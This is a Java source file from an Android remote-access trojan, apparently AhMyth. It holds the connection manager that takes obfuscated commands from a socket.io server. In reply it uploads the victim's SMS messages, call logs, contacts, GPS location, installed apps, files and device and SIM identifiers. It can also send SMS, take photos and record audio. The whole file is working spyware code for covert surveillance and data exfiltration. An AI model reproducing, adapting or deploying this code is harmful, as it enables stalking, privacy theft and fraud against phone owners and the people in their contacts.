package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Looper;
import android.provider.ContactsContract;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.text.TextUtils;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.DateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import io.socket.emitter.Emitter;


/**
 * Created by AhMyth on 10/1/16.
 */

public class ConnectionManager {


    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();

    public static void startAsync(Context con) {
        try {
            context = con;
            sendReq();
        } catch (Exception ex) {
            startAsync(con);
        }

    }


    public static void sendReq() {
        try {


            if (ioSocket != null)
                return;

            ioSocket = IOSocket.getInstance().getIoSocket();


            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong");
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("order");
                        Log.e("order", order);
                        switch (order) {
                            case "x0000ca":
                                if (data.getString("extra").equals("camList"))
                                    x0000ca(-1);
                                else if (data.getString("extra").equals("1"))
                                    x0000ca(1);
                                else if (data.getString("extra").equals("0"))
                                    x0000ca(0);
                                break;
                            case "x0000fm":
                                if (data.getString("extra").equals("ls"))
                                    x0000fm(0, data.getString("path"));
                                else if (data.getString("extra").equals("dl"))
                                    x0000fm(1, data.getString("path"));
                                break;
                            case "x0000sm":
                                if (data.getString("extra").equals("ls"))
                                    x0000sm(0, null, null);
                                else if (data.getString("extra").equals("sendSMS"))
                                    x0000sm(1, data.getString("to"), data.getString("sms"));
                                break;
                            case "x0000cl":
                                x0000cl();
                                break;
                            case "x0000cn":
                                x0000cn();
                                break;
                            case "x0000mc":
                                x0000mc(data.getInt("sec"));
                                break;
                            case "x0000lm":
                                x0000lm();
                                break;
                            case "x0000in":
                                Log.e("case 0in", "case");
                                x0000in();
                                break;
                            case "x0000ia":
                                Log.e("case 0ia", "case");
                                x0000ia();
                                break;

                        }


                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            ioSocket.connect();

        } catch (Exception ex) {

            Log.e("error", ex.getMessage());

        }

    }

    public static void x0000ca(int req) {

        if (req == -1) {
            JSONObject cameraList = new CameraManager(context).findCameraList();
            if (cameraList != null)
                ioSocket.emit("x0000ca", cameraList);
        } else {
            new CameraManager(context).startUp(req);
        }

    }

    public static void x0000fm(int req, String path) {
        if (req == 0)
            ioSocket.emit("x0000fm", fm.walk(path));
        else if (req == 1)
            fm.downloadFile(path);
    }


    public static void x0000sm(int req, String phoneNo, String msg) {
        if (req == 0)
            ioSocket.emit("x0000sm", SMSManager.getSMSList());
        else if (req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit("x0000sm", isSent);
        }
    }

    public static void x0000cl() {
        ioSocket.emit("x0000cl", CallsManager.getCallsLogs());
    }

    public static void x0000cn() {
        ioSocket.emit("x0000cn", ContactsManager.getContacts());
    }

    public static void x0000mc(int sec) throws Exception {
        MicManager.startRecording(sec);
    }

    public static void x0000lm() throws Exception {
        Looper.prepare();
        LocManager gps = new LocManager(context);
        JSONObject location = new JSONObject();
        // check if GPS enabled
        if (gps.canGetLocation()) {

            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            Log.e("loc", latitude + "   ,  " + longitude);
            location.put("enable", true);
            location.put("lat", latitude);
            location.put("lng", longitude);
        } else
            location.put("enable", false);

        ioSocket.emit("x0000lm", location);
    }

    public static void x0000in() throws Exception {

        try {

            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            WifiManager wfm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            BroadcastReceiver brRec = null;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {

                    return;
                }
            }

            JSONObject contacts = new JSONObject();
            JSONArray list = new JSONArray();

            String[] param = {"Model :", "Board :", "Brand :", "Bootloader :", "Device :", "Display :",
                    "Fingerprint :", "Hardware :", "HOST :", "ID :", "Manufacturer :", "Product :",
                    "Serial :", "Tags :", "User :", "Time :", "Release :", "SDK_INT :", "Language :",
                    "Time :", "IMSi :", "IMEi :", "Sim Serial Number :", "Sim Operator :",
                    "Sim Operator Name :", "Line Number :", "Sim CountryIso :","More SimInfo :",
                    "MacAddress :","SSId :","Link Speed :","RssI :","Battery Level :","Usb connect:"};
            for (int i = 0; i < param.length; i++) {
                JSONObject contact = new JSONObject();
                String name = param[i];

                contact.put("param", name);
                switch (i) {
                    case 0:
                        contact.put("info", Build.MODEL);
                        break;
                    case 1:
                        contact.put("info", Build.BOARD);
                        break;
                    case 2:
                        contact.put("info", Build.BRAND);
                        break;
                    case 3:
                        contact.put("info", Build.BOOTLOADER);
                        break;
                    case 4:
                        contact.put("info", Build.DEVICE);
                        break;
                    case 5:
                        contact.put("info", Build.DISPLAY);
                        break;
                    case 6:
                        contact.put("info", Build.FINGERPRINT);
                        break;
                    case 7:
                        contact.put("info", Build.HARDWARE);
                        break;
                    case 8:
                        contact.put("info", Build.HOST);
                        break;
                    case 9:
                        contact.put("info", Build.ID);
                        break;
                    case 10:
                        contact.put("info", Build.MANUFACTURER);
                        break;
                    case 11:
                        contact.put("info", Build.PRODUCT);
                        break;
                    case 12:
                        contact.put("info", Build.SERIAL);
                        break;
                    case 13:
                        contact.put("info", Build.TAGS);
                        break;
                    case 14:
                        contact.put("info", Build.USER);
                        break;
                    case 15:
                        contact.put("info", Build.TIME);
                        break;
                    case 16:
                        contact.put("info", Build.VERSION.RELEASE);
                        break;
                    case 17:
                        contact.put("info", Build.VERSION.SDK_INT);
                        break;
                    case 18:
                        contact.put("info", Locale.getDefault().getDisplayLanguage());
                        break;
                    case 19:
                        contact.put("info", DateFormat.getDateTimeInstance().format(new Date()));
                        break;
                    case 20:
                        contact.put("info", tm.getSubscriberId());
                        break;
                    case 21:
                        contact.put("info", tm.getDeviceId());
                        break;
                    case 22:
                        contact.put("info", tm.getSimSerialNumber());
                        break;
                    case 23:
                        contact.put("info", tm.getSimOperator());
                        break;
                    case 24:
                        contact.put("info", tm.getSimOperatorName());
                        break;
                    case 25:
                        contact.put("info", tm.getLine1Number());
                        break;
                    case 26:
                        contact.put("info", tm.getSimCountryIso());
                        break;
                    case 27:
                        String s = tm.getSimOperator();
                        StringBuilder sb = new StringBuilder();
                        if (!s.isEmpty()){
                            CellLocation cl = tm.getCellLocation();
                            sb.append("MCC - Mobile Country Code :" + s.substring(0, 3));
                            sb.append("MNC - Mobile Network Code :" + s.substring(3));
                            sb.append("CID - Cell ID :" + ((GsmCellLocation)cl).getCid());
                            sb.append("LAC - Location Area Code :" + ((GsmCellLocation)cl).getLac());

                            contact.put("info", sb);
                        }
                        break;
                    case 28:
                        contact.put("info", wfm.getConnectionInfo().getMacAddress());
                        break;
                    case 29:
                        contact.put("info", wfm.getConnectionInfo().getSSID());
                        break;
                    case 30:
                        contact.put("info", wfm.getConnectionInfo().getLinkSpeed()+ "dBm");
                        break;
                    case 31:
                        contact.put("info", WifiManager.calculateSignalLevel(wfm.getConnectionInfo().getRssi(), 5));
                        break;
                    case 32:
                        Intent battery = context.registerReceiver(brRec, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
                        int lv = battery.getIntExtra("level", 0) * 100 / battery.getIntExtra("scale", 100);
                        contact.put("info", lv + "%");
                        break;
                    case 33:
                        int usb = context.registerReceiver(brRec, new IntentFilter("android.intent.action.BATTERY_CHANGED")).getIntExtra("plugged", -1);
                        if (usb == 1){
                            contact.put("info", "true");
                        } else contact.put("info", "false");

                        break;
                }
                list.put(contact);
            }

            contacts.put("infoList", list);
            ioSocket.emit("x0000in", /*location*/contacts);

        } catch (JSONException e){
            e.printStackTrace();
        }

    }

    public static void x0000ia(){
        ioSocket.emit("x0000ia", AppsManager.getAppsInfo());
    }



}
